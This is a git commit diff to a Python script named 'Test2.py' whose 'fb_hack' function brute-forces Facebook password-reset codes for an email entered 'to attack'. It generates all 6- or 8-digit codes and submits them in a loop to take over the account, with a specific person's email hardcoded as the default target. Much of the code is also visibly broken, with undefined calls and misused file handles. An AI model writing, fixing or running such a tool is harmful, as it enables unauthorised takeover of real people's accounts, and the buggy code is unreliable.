4eb5dd36d984d71ec168d0c0ac91a6b3c8731b94
krarktel112 <krarktel@gmail.com>
2024-09-15 20:58:27 -0400

    Update Test2.py

--- Test2.py
+++ Test2.py
@@ -25,7 +25,7 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def passcoder(pass0):
+def passcode6():
   try:
     f = open("6digits.txt", "a")
     f.close()
@@ -38,8 +38,8 @@ def passcoder(pass0):
     z.close()
   except:
     z = open("8digits.txt", "a+")
-    for combination in itertools.product(range(10), repeat=6):
-        z.write(''.join(map(str, combination)))
+    for combination in itertools.product(range(10), repeat=8):
+      z.write(''.join(map(str, combination)))
 
 def sleepy(counter):
   x = counter
@@ -47,7 +47,7 @@ def sleepy(counter):
   while x > y:
     x -= 1
     z = x
-    if x <= 9
+    if x <= 9:
       code = ("0", str(z))
       yo = h.join(code)
       x 
@@ -64,43 +64,53 @@ def fb_hack(email, codex):
   browser.set_cookiejar(cookies)
   browser.addheaders = [('User-agent', MOZILLA_UAS)]
   browser.set_handle_refresh(False)
-  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+  browser.open('https://Facebook.com')
   try:
     browser.select_form(nr=0)
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a+") as z:
-        z.write(str(reset1))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
-    raise
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    print("1")
+    with open("output1.html", "w") as file:
+      file.write(str(soup))
+    print(browser.geturl())
+    print(browser.find_link())
+    sys.exit()
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
   try:
     browser.select_form(nr=0)
+    browser.submit()
   except:
-    with open("emails.txt", "a") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = reset
-    raise
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
-  browser.select_form(nr=0)
-  browser.submit()
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("output2.html", "w") as file:
+      file.write(str(soup))
+    print("2")
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("output3.html", "w") as file:
+      file.write(string(soup))
+    print("3")
+    sys.exit()
+  try:
+    browser.select_form(nr=0)
+    browser.submit()
+  except:
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    Iprint(soup.find(string("Facebook is not available on this browser")))
+    with open("output4.html", "w") as file:
+      file.write(str(soup))
+    print("4")
+    sys.exit()
   """reset code input"""
   y = int(codex)
   response1 = browser.response()
@@ -111,23 +121,23 @@ def fb_hack(email, codex):
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
+    attempt = int(codex)
     print(check1)
+    f = open("6digits.txt", "r")
+    attempt = int(codex)
     while check1 != test:
       browser.select_form(nr=0)
-      f = open("6digits.txt", "r")
-      y = f.readlines(reset)
+      y = f.readlines(attempt)
+      attempt += 1
       browser.form['n'] = y
       browser.submit()
       print(y, end='\r')
       fail = (y, "failed")
       success = (y, "succeded")
       s = " "
-      reset -= 1
-      reset1 = reset
-      f.close()
-      with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
+      with open("passcoder.txt", "a+") as z:
+        f.write(str(attempt))
+        f.close()
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -145,11 +155,12 @@ def fb_hack(email, codex):
           print(s.join(success))
   elif check2 != test:
     print(check2)
-    reset = int(codex)
+    attempt = int(codex)
+    f = open("8digits.txt", "r")
     while check2 != check4:
       browser.select_form(nr=0)
-      f = open("8digits.txt", "r")
-      y = f.readlines(reset)
+      y = f.readlines(attempt)
+      attempt += 1
       browser.form['n'] = y
       browser.submit()
       print(str(y), end='\r')
@@ -173,6 +184,7 @@ def fb_hack(email, codex):
         if soup.find(string="password_new") == test:
           print("Password not found")
           print(browser.geturl())
+          print(browser.response())
           browser.close()
         else:
           print(s.join(success))
@@ -183,6 +195,7 @@ def fb_hack(email, codex):
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
+    print(response1)
     if soup.find(string="password_new") == test:
       print("Passcode not found")
     elif soup.find(string="password_new") != test:
@@ -190,35 +203,11 @@ def fb_hack(email, codex):
       print(y)
       browser.close()
       reset = int(-1)
-  return reset in reset1, y in passcoder, browser
+  return reset, y, browser
 
 os.system('clear')
-ehack = input('Email address or username to attack:')
-reset = int(input('Code: ') or 99999999)
-reset1 = reset
-f = open("emails.txt", "a")
-z = open("passcoder.txt", "a")
-f.write(ehack)
-f.close()
-z.write(str(reset1))
-z.close()
+passcode6()
 
-while True:
-  try:
-    fb_hack(ehack, reset)
-    reset = reset1
-    if int(reset1) < int(0):
-      break
-    else:
-      reset = reset1
-  except:
-    sys.exit()
-    with open(emails.txt, "r") as f:
-      ehack = f.readlines(-1)
-      f.close()
-    with open(passcoder.txt, "r") as f:
-      reset = int(z.readlines(-1))
-      z.close()
-    print("Restarting")
-    sleepy(30)
-    fb_hack(ehack, reset)
+ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
+reset = int(input('Code: ') or 99999999)
+fb_hack(ehack, reset)
